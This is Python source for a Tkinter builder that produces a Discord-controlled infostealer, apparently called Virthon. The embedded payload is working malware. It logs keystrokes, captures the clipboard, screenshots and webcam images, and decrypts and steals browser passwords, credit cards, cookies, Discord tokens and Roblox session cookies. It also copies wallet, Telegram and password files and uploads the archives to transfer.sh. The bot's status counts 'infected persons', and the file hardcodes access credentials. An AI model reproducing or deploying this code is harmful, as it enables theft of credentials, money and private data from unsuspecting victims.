import tkinter as tk
from ttkthemes import ThemedTk
import os
from tkinter import messagebox

user_name = os.getlogin()

file_path = fr"c:\Users\{user_name}\user_virthon.txt"

dark_background = "#808080"

user_credentials = [
    ("stelow", "rzazDzNflAW7BQAfG8Vt"),
    ("kowa", "VQKg9lxLvpcxoGubVWpu"),
    ("mizorui", "jrEzBiBFTFoX6ZajGRFS"),
    ("H3", "1GSWBZrxdmtnKISONMP3"),
    ("tatsu", "TkIHqaOmypZq4iefbZcT"),
    ("gagnant1", "HWKMabIKyxoDkWKKEbqn"),
    ("gagnant2", "CLqUBapu0dCbsRphBHG5"),
    ("gagnant3", "XR1IoIvjLDdHVbtTFo2B"),
]

def check_login():
    builder()
    return

def builder():
    root.destroy()
    import os 
    import shutil
    import os
    import random
    import base64
    import marshal
    import zlib
    from cryptography.fernet import Fernet
    from colorama import Fore, init
    import tkinter as tk
    import threading
    from tkinter import ttk
    from tkinter import filedialog
    import requests
    import zipfile
    import glob
    import io
    import sys
    from ttkthemes import ThemedTk
    username = os.getlogin()
    user = rf"c:\Users\{username}"
    username = os.getlogin()
    user = rf"c:\Users\{username}"
    nom_dossier = fr"{user}\Virthon"
    source_directory = rf"{user}\Downloads\stelows-Virthon_bot-*"
    destination_file = rf"{user}\Virthon\builder.exe"
    repository_owner = "stelows"
    repository_name = "Virthon_bot"
    version = "1.0.0"
    def update():
        if not os.path.exists(nom_dossier):
            os.mkdir(nom_dossier)
        async def get_latest_release_info():
            url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/releases/latest"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                return data["tag_name"], data["zipball_url"]
            else:
                if len(response.status_code) > 1024:
                    truncated_content = response.status_code[:1020] + "..."
                else:
                    truncated_content = response.status_code
        async def check_for_updates():
            current_version = version
            latest_version, download_url = await get_latest_release_info()
            if current_version == latest_version:
                pass
            else:
                await download_and_extract_latest_release(download_url)

        async def download_and_extract_latest_release(download_url):
            response = requests.get(download_url)
            if response.status_code == 200:
                zip_data = io.BytesIO(response.content)
                with zipfile.ZipFile(zip_data, 'r') as zip_ref:
                    zip_ref.extractall(rf"{user}\Downloads")
                python_files = glob.glob(os.path.join(source_directory, "builder.exe"))
                if python_files:
                    source_file = python_files[0]
                    clone_file(source_file, destination_file)
                    os.remove(source_file)
                    os.startfile(destination_file)
                else:
                    pass
            else:
                pass
            sys.exit()
        def clone_file(source, destination):
            with open(source, 'rb') as source_file:
                contenu = source_file.read()
            with open(destination, 'wb') as destination_file:
                destination_file.write(contenu)

        check_for_updates

    update()

    def obfuscate_code():
        filename = filename_entry.get()
        guild_id = guild_id_entry.get()
        bot_token = bot_token_entry.get()
        if not filename or not guild_id or not bot_token:
            messagebox.showerror("Error", "Please fill in all fields before continuing.")
            return
        if not filename.lower().endswith(".exe"):
            filename += ".exe"
        filename_entry.delete(0, tk.END)
        filename_entry.insert(0, filename)
        def main():
            data = r"""mac = get_mac()
username = os.getlogin()
pc_name = socket.gethostname()
user = rf"c:\Users\{username}"
fichier_path = fr"{user}\.{mac}-data"
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
"""fr"""
guild_id = {guild_id}
"""r"""
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
username = os.getlogin()
pc_name = socket.gethostname()
loop = asyncio.get_event_loop()
date = datetime.now()
lettres_disques = [d.device for d in psutil.disk_partitions()]
user = rf"c:\Users\{username}"
embed = Embed(title="Virthon", description="Files are only stored for 14 days", color=0x03b2f8)
nom_dossier = fr"{user}\Virthon"
source_directory = rf"{user}\Downloads\stelows-Virthon_bot-*"
destination_file = rf"{user}\Virthon\virthon.exe"
extension_cible = [".kdbx"]
noms_de_fichiers = ["motdepasse","metamask","mot de passe","password","pswrd","mot_de_passe","code_A2F","code A2F","A2F code","A2F_code","mdp","discord_backup_codes","discord backup codes","discordbackupcodes","snapchat","homework","travail","travaux","daesh","al-qaida","al_qaida","alqaida","al qaida","al hayat media center","alhayatmediacenter","al_hayat_media_center","al-qaeda","al_qaeda","alqaeda","al qaeda","Talibans","Taliban","al-qassam","al_qassam","alqassam","al qassam","nasheed","Djihad"]
version = "1.0.0"
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
n = os.linesep
keys = []
tokens = []
cleaned = []
checker = []
o = 0
keys_n = 1
line_n = 1
nav_list = ["taskkill /f /im chrome.exe","taskkill /f /im msedge.exe"]
def closeChrome():
    for nav in nav_list:
        try:
            os.system(nav)
            pass
        except:
            pass
    clear_terminal()

clear_terminal()

def on_press(key):
    global keys_n
    try:
        keys.append(f"[{keys_n}] : {key.char}{n}")
        keys_n += 1
    except AttributeError:
        keys.append(f"[{keys_n}] : {key}{n}")
        keys_n += 1

def copier_fichiers_disques_externes():
    liste_impfiles = [
        f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet",
        f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet",
        "C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam",
        f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory",
        f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient",
        f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"
    ]

    dossier_destination1 = rf"{user}\impfiles"

    if not os.path.exists(dossier_destination1):
        os.mkdir(dossier_destination1)
    else:
        shutil.rmtree(dossier_destination1)
        os.mkdir(dossier_destination1)

    with ThreadPoolExecutor() as executor:
        futures = []
        for lettre_disque in lettres_disques:
            for dossier_actuel, sous_dossiers, fichiers in os.walk(lettre_disque):
                for nom_fichier in fichiers:
                    _, extension = os.path.splitext(nom_fichier)
                    if extension in extension_cible:
                        chemin_source = os.path.join(dossier_actuel, nom_fichier)
                        chemin_destination = os.path.join(dossier_destination1, nom_fichier)
                        try:
                            futures.append(executor.submit(shutil.copy2, chemin_source, chemin_destination))
                        except:
                            pass
                    for nom_a_chercher in noms_de_fichiers:
                        if nom_a_chercher.lower() in nom_fichier.lower() and extension.lower() != ".lnk":
                            chemin_complet = os.path.join(dossier_actuel, nom_fichier)
                            dossier_destination_all = os.path.join(dossier_destination1, nom_fichier)
                            try:
                                if os.path.isdir(chemin_complet):
                                    futures.append(executor.submit(shutil.copytree, chemin_complet, dossier_destination_all))
                                else:
                                    futures.append(executor.submit(shutil.copy2, chemin_complet, dossier_destination_all))
                            except:
                                pass
    for element in liste_impfiles:
        element_path = os.path.join(dossier_destination1, element)
        try:
            if os.path.isdir(element_path):
                shutil.copytree(element_path, os.path.join(dossier_destination1, os.path.basename(element_path)))
            else:
                shutil.copy2(element_path, dossier_destination1)
        except:
            pass

    for future in futures:
        try:
            future.result()
        except:
            pass
    dossier_source = dossier_destination1
    dossier_destination2 = fr"{user}"
    nom_fichier_zip = 'impfiles.zip'
    size_in_bytes = get_folder_size(dossier_source)
    size_in_gb = size_in_bytes / (1024 ** 3)
    if size_in_gb > 10:
        embed.add_field(name=f"fichier `{nom_fichier_zip}` trop volumineux.", value=f"Le fichier `{dossier_source}` est trop volumineux (il fait `{size_in_gb}`gb et la taille maximale est 10 gb attendez des nouvelles mises a jour qui pourraient regler ce probleme ou contactez-nous [ici](https://discord.gg/PhYb2fFxPC).)", inline=True)
    else:
        shutil.make_archive(
        os.path.join(dossier_destination2, nom_fichier_zip.split('.')[0]),
        'zip',
        dossier_source
        )
        zip_file_path = os.path.join(dossier_destination2, nom_fichier_zip)
        upload_to_transfer_sh(zip_file_path, nom_fichier_zip)
        os.remove(fr"{dossier_destination2}\{nom_fichier_zip}")
        try:
            shutil.rmtree(fr"{dossier_destination1}")
        except Exception as e:
            truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
            embed.add_field(name=".", value=truncated_content, inline=True)
            
def upload_to_transfer_sh(zip_file_path, nom_fichier_zip):
    try:
        url = 'https://transfer.sh/'
        files = {'file': (zip_file_path, open(zip_file_path, 'rb'))}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            download_link = response.text
            embed.add_field(name=f"{nom_fichier_zip}".replace(".zip", "").replace("-"," ").replace(","," ").replace("_"," "), value=f"[Telecharger]({download_link}).", inline=True)
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)

def get_folder_size(folder_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            total_size += os.path.getsize(filepath)
    total_size = round(total_size, 2)
    return total_size

def obtenir_taille_fichier_mb(chemin_du_fichier, nom_fichier_zip):
    if not os.path.exists(chemin_du_fichier):
        pass
    taille_en_octets = os.path.getsize(chemin_du_fichier)
    taille_en_mb = taille_en_octets / (1024 * 1024)
    if taille_en_mb > 8:
        upload_to_transfer_sh(chemin_du_fichier, nom_fichier_zip)
    else:
        pass

async def get_and_upload_folder(dossier_source, dossier_destination, nom_fichier_zip):
    try:
        loop = asyncio.get_event_loop()
        size_in_bytes = await loop.run_in_executor(None, get_folder_size, dossier_source)
        size_in_gb = size_in_bytes / (1024 ** 3)
        if size_in_gb > 10:
            embed.add_field(name=f"fichier `{nom_fichier_zip}` trop volumineux.", value=f"Le fichier `{dossier_source}` est trop volumineux (il fait `{size_in_gb}`gb et la taille maximale est 10 gb attendez des nouvelles mises a jour qui pourraient regler ce probleme ou contactez-nous [ici](https://youtube.com).)", inline=True)
        else:
            await loop.run_in_executor(None, shutil.make_archive, os.path.join(dossier_destination, nom_fichier_zip.split('.')[0]), 'zip', dossier_source)
            zip_file_path = os.path.join(dossier_destination, nom_fichier_zip)
            await loop.run_in_executor(None, upload_to_transfer_sh, zip_file_path, nom_fichier_zip)
            os.remove(fr"{dossier_destination}\{nom_fichier_zip}")
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)

async def get_folder():
    dossiers_a_traiter = [
        (fr"{user}\Pictures", fr"{user}", 'Pictures.zip'),
        (fr"{user}\Music", fr"{user}", 'Music.zip'),
        (fr"{user}\Videos", fr"{user}", 'Videos.zip'),
        (fr"{user}\Downloads", fr"{user}", 'Downloads.zip'),
        (fr"{user}\Documents", fr"{user}", 'Documents.zip'),
        (fr"{user}\Desktop", fr"{user}", 'Desktop.zip'),
        (fr"{user}\OneDrive", fr"{user}", 'OneDrive.zip')
    ]
    tasks = [get_and_upload_folder(*args) for args in dossiers_a_traiter]
    await asyncio.gather(*tasks)

def screenshot_and_screecam():
    nb = 0
    cam = 0
    cam_del = 1
    cam_list = []
    screen = 0
    screen_list = []
    o = 0
    fp = rf"{user}\{nb}.jpg"
    try:
        screens = getDisplayRects()
        while screen < len(screens):
            try:
                rect = getRectAsImage(screens[screen])
                image_path = rf'{user}\{o}.jpg'
                rect.save(image_path, format='JPEG')
                screen_list.append(image_path)
                o += 1
                screen += 1
            except:
                break
        try:
            images = [Image.open(x) for x in screen_list]
            total_width = sum(img.size[0] for img in images)
            max_height = max(img.size[1] for img in images)

            new_img = Image.new('RGB', (total_width, max_height))
            current_width = 0

            for img in images:
                new_img.paste(img, (current_width, 0))
                current_width += img.size[0]
            global image_full_screen
            image_full_screen = rf'{user}\total_screen.jpg'
            new_img.save(image_full_screen)
        finally:
            for image_path in screen_list:
                os.remove(image_path)
                global file
                file = discord.File(image_full_screen, filename=f"screenshot_{pc_name}.jpg")
                embed.set_thumbnail(url=f"attachment://screenshot_{pc_name}.jpg")
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)
    try:
        while True:
            try:
                nb =+ 1
                fp = rf"{user}\{nb}.jpg"
                cap = cv2.VideoCapture(cam)
                ret, frame = cap.read()
                cv2.imwrite(fp, frame)
                cap.release()
                cam += 1
                cam_list.append(f"{cam}.jpg")
            except:
                clear_terminal()
                break
            finally:
                images = [Image.open(os.path.join(user, x)) for x in cam_list if os.path.exists(os.path.join(user, x))]
                if images:
                    total_width = 0
                    max_height = 0
                    for img in images:
                        total_width += img.size[0]
                        max_height = max(max_height, img.size[1])
                    new_img = Image.new('RGB', (total_width, max_height))
                    current_width = 0
                    for img in images:
                        new_img.paste(img, (current_width,0))
                        current_width += img.size[0]
                    new_img.save(rf'{user}\screencam.jpg')
        global file_cam
        file_cam = discord.File(rf"{user}\screencam.jpg", filename=f"screencam_{pc_name}.jpg")
        embed.set_image(url=f"attachment://screencam_{pc_name}.jpg")
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)
    try:
        while True:
            try:
                os.remove(rf"{user}\{cam_del}.jpg")
                cam_del += 1
            except:
                break
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_history():
    try:
        closeChrome()
        outputs = browser_history.get_history()
        clear_terminal()
        with open(fr'{user}\history.csv', 'w', encoding='utf-8') as f:
            f.write(outputs.to_csv().encode('utf-8', errors='replace').decode('utf-8'))
            f.close()
        obtenir_taille_fichier_mb(fr'{user}\history.csv', "history")
        try:
            global file_hist
            file_hist = discord.File(fr'{user}\history.csv', filename=f"SPOILER_all_browser_history_{pc_name}.csv")
        except Exception as e:
            truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
            embed.add_field(name=".", value=truncated_content, inline=True)
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)

def get_ip_address():
    ip = requests.get('https://ipinfo.io').text.replace("{", "").replace("}", "").replace('"', "").replace(",", " ").replace("readme: https://ipinfo.io/missingauth", "").replace("city: ", "potential city: ").replace("postal: ", "approximate postal code: ").replace("ip: ", "ip: ||").replace("hostname:", "||hostname: ||").replace("potential city:", "||potential city:")
    first_line = ip.splitlines()[6].replace(" ",",")
    entre_deux = first_line.replace(",,loc:,", "")
    googlemaps = entre_deux[:-1]
    googlemapslink = f"https://www.google.fr/maps/search/{googlemaps}/"
    embed.add_field(name="Wi-Fi Information", value=f"{ip} [approximate address]({googlemapslink}).", inline=False)

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + r"\Google\Chrome\User Data"
    paths = {
        'Discord': roaming + r'\discord',
        'Discord Canary': roaming + r'\discordcanary',
        'Lightcord': roaming + r'\Lightcord',
        'Discord PTB': roaming + r'\discordptb',
        'Opera': roaming + r'\Opera Software\Opera Stable',
        'Opera GX': roaming + r'\Opera Software\Opera GX Stable',
        'Amigo': local + r'\Amigo\User Data',
        'Torch': local + r'\Torch\User Data',
        'Kometa': local + r'\Kometa\User Data',
        'Orbitum': local + r'\Orbitum\User Data',
        'CentBrowser': local + r'\CentBrowser\User Data',
        '7Star': local + r'\7Star\7Star\User Data',
        'Sputnik': local + r'\Sputnik\Sputnik\User Data',
        'Vivaldi': local + r'\Vivaldi\User Data\Default',
        'Chrome SxS': local + r'\Google\Chrome SxS\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + r'\Epic Privacy Browser\User Data',
        'Microsoft Edge': local + r'\Microsoft\Edge\User Data\Defaul',
        'Uran': local + r'\uCozMedia\Uran\User Data\Default',
        'Yandex': local + r'\Yandex\YandexBrowser\User Data\Default',
        'Brave': local + r'\BraveSoftware\Brave-Browser\User Data\Default',
        'Iridium': local + r'\Iridium\User Data\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): 
            continue
        try:
            with open(path + rf"\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: 
            continue
        for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): 
                continue
            else:
                try:
                    with open(path + rf"\Local Storage\leveldb\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall("dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*", x):
                                tokens.append(values)
                except: 
                    continue
        for i in tokens:
            if i.endswith("\\\\"):
                i.replace("\\\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except: 
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: 
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        user_name = f'{res_json["username"]}\#{res_json["discriminator"]}'.replace("\#0", "")
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed.add_field(name=f"{user_name} ({user_id})", value=f"Email: ||{email}|| {n}Telephone: ||{phone}||{n}2FA/MFA Activer: {mfa_enabled}{n}Nitro: {has_nitro}{n}Expire dans: {(days_left if days_left else '0')} jour(s){n}Token: ||{tok}||", inline=False)

async def get_roblosecurity():
  def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

  cookies = cookieLogger()
  roblox_cookie = cookies[1]

  isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
  if isvalid == "Valid Cookie":
    ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
    info = json.loads(ebruh.text)
    rid = info["UserID"]
    roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
    rusername = info['UserName']
    robux = info['RobuxBalance']
    premium = info['IsPremium']
    pattern = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"
    roblosecurity_final = roblox_cookie.replace(pattern, "")
    embed.add_field(name="Roblox Account Info", value=f"name: [{rusername}]({roblox_profile}) / Robux: {robux} / Premium: {premium}", inline=False)
    if len(roblosecurity_final) <= 1024:
        embed.add_field(name=f"Roblox Account Cookie", value=f"||{roblosecurity_final}||", inline=False)
    else:
        with open(fr'{user}\roblosecurity.txt', 'w') as f:
            f.write(roblosecurity_final)
            f.close()
        try:
            global file_roblox
            file_roblox = discord.File(fr'{user}\roblosecurity.txt', filename=f"SPOILER_roblox_cookie_{pc_name}.txt")
        except Exception as e:
            truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
            embed.add_field(name=".", value=truncated_content, inline=True)
  else:
      pass

async def get_all_info_browser():
    appdata = os.getenv('LOCALAPPDATA')

    browsers = {
    'avast': appdata + r'\AVAST Software\Browser\User Data',
    'amigo': appdata + r'\Amigo\User Data',
    'torch': appdata + r'\Torch\User Data',
    'kometa': appdata + r'\Kometa\User Data',
    'orbitum': appdata + r'\Orbitum\User Data',
    'cent-browser': appdata + r'\CentBrowser\User Data',
    '7star': appdata + r'\7Star\7Star\User Data',
    'sputnik': appdata + r'\Sputnik\Sputnik\User Data',
    'vivaldi': appdata + r'\Vivaldi\User Data',
    'google-chrome-sxs': appdata + r'\Google\Chrome SxS\User Data',
    'google-chrome': appdata + r'\Google\Chrome\User Data',
    'epic-privacy-browser': appdata + r'\Epic Privacy Browser\User Data',
    'microsoft-edge': appdata + r'\Microsoft\Edge\User Data',
    'uran': appdata + r'\uCozMedia\Uran\User Data',
    'yandex': appdata + r'\Yandex\YandexBrowser\User Data',
    'brave': appdata + r'\BraveSoftware\Brave-Browser\User Data',
    'iridium': appdata + r'\Iridium\User Data',}

    data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': r'\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': r'\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': fr'\network\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': r'\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': r'\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }}

    def get_master_key(path: str):
        if not os.path.exists(path):
            return
        if 'os_crypt' not in open(path + r"\Local State", 'r', encoding='utf-8').read():
            return
        with open(path + r"\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        try:
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key
        except:
            pass
    def decrypt_password(buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def save_results(browser_name, type_of_data, content):
        dossier_source = fr"{user}\{browser_name}"
        if not os.path.exists(dossier_source):
            os.mkdir(dossier_source)
        if content is not None:
            open(fr'{dossier_source}\{type_of_data}.txt', 'w', encoding="utf-8").write(content)
        else:
            pass

    def get_data(path: str, profile: str, key, type_of_data):
        db_file = fr'{path}\{profile}{type_of_data["file"]}'
        if not os.path.exists(db_file):
            return
        result = ""
        try:
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += f"{n}".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + f"{n}{n}"
            conn.close()
            os.remove('temp_db')
            return result
        except:
            pass

    def convert_chrome_time(chrome_time):
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

    def installed_browsers():
        available = []
        for x in browsers.keys():
            if os.path.exists(browsers[x]):
                available.append(x)
        return available
    global available_browsers
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)
        dossier_source = fr"{user}\{browser}"
        dossier_destination = fr"{user}"
        nom_fichier_zip = f'{browser}.zip'
        global dossier_source_zip
        dossier_source_zip = fr"{user}\{nom_fichier_zip}"
        size_in_bytes = get_folder_size(dossier_source)
        size_in_gb = size_in_bytes / (1024 ** 3)
        if size_in_gb > 10:
            embed.add_field(name=f"fichier `{nom_fichier_zip}` trop volumineux.", value=f"Le fichier `{dossier_source}` est trop volumineux (il fait `{size_in_gb}`gb et la taille maximale est 10 gb attendez des nouvelles mises a jour qui pourraient regler ce probleme ou contactez-nous [ici](https://youtube.com).)", inline=True)
        else:
            shutil.make_archive(
            os.path.join(dossier_destination, nom_fichier_zip.split('.')[0]),
            'zip',
            dossier_source
            )
            zip_file_path = os.path.join(dossier_destination, nom_fichier_zip)
            upload_to_transfer_sh(zip_file_path, nom_fichier_zip)
            try:
                shutil.rmtree(dossier_source)
            except Exception as e:
                truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
                embed.add_field(name=".", value=truncated_content, inline=True)
            try:
                os.remove(dossier_source_zip)
            except Exception as e:
                truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
                embed.add_field(name=".", value=truncated_content, inline=True)

def on_release(key):
    pass

def keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def get_folder_asyc():
    asyncio.run(get_folder())
    
def get_rb_asyc():
    asyncio.run(get_roblosecurity())

def get_all_info_browser_asyc():
    asyncio.run(get_all_info_browser())

clipboard_content = pyperclip.paste()

if clipboard_content is not None:
    if len(clipboard_content) > 1024:
        with open(fr'{user}\paperclip.txt', 'w', encoding='utf-8') as f:
            f.write(clipboard_content)
            f.close()
        try:
            file_paperclip = discord.File(fr'{user}\paperclip.txt', filename=f"SPOILER_paperclip_{pc_name}.txt")
        except Exception as e:
            truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
            embed.add_field(name=".", value=truncated_content, inline=True)
    else:
        truncated_content = clipboard_content
else:
    truncated_content = "None"
    
image_folder = threading.Thread(target=get_folder_asyc)
Bgrabber = threading.Thread(target=get_all_info_browser_asyc)
get_ip = threading.Thread(target=get_ip_address)
screensho = threading.Thread(target=screenshot_and_screecam)
get_history_csv = threading.Thread(target=get_history)
get_tok = threading.Thread(target=get_token)
kelogger = threading.Thread(target=keylogger)
rb_sec = threading.Thread(target=get_rb_asyc)
copier_fichiers_disques_ext = threading.Thread(target=copier_fichiers_disques_externes)
def blocking_code():
    image_folder.start()
    get_ip.start()
    get_history_csv.start()
    screensho.start()
    Bgrabber.start()
    get_tok.start()
    kelogger.start()
    copier_fichiers_disques_ext.start()
    rb_sec.start()
    try:
        embed.add_field(name="paper clip", value=f"||{truncated_content}||")
    except:
        pass
    image_folder.join()
    get_ip.join()
    get_history_csv.join()
    screensho.join()
    Bgrabber.join()
    get_tok.join()
    copier_fichiers_disques_ext.join()
    rb_sec.join()
async def blocking_code_start(message, updated1_embed):
    tasks = [asyncio.to_thread(copier_fichiers_disques_ext.join), asyncio.to_thread(image_folder.join)]
    image_folder.start()
    get_ip.start()
    get_history_csv.start()
    screensho.start()
    Bgrabber.start()
    get_tok.start()
    kelogger.start()
    copier_fichiers_disques_ext.start()
    rb_sec.start()
    try:
        embed.add_field(name="paper clip", value=f"||{truncated_content}||")
    except Exception as e:
        truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
        embed.add_field(name=".", value=truncated_content, inline=True)
    await message.edit(embed=updated1_embed)
    get_ip.join()
    get_history_csv.join()
    screensho.join()
    Bgrabber.join()
    get_tok.join()
    rb_sec.join()
    await asyncio.gather(*tasks)
def main():
    @bot.event
    async def on_ready():
        clear_terminal()
        try:
            synced = await bot.tree.sync()
        except:
            pass
        guild = bot.get_guild(guild_id)
        @tasks.loop(seconds=10)
        async def update_presence():
            i = 0
            for guild in bot.guilds:
                for category in guild.categories:
                    i += 1
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f'{i} infected persons'))
        try:
            update_presence.start()
        except:
            pass
        new_category = await guild.create_category(f"{mac}-{username}", overwrites={
            guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False), 
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)})
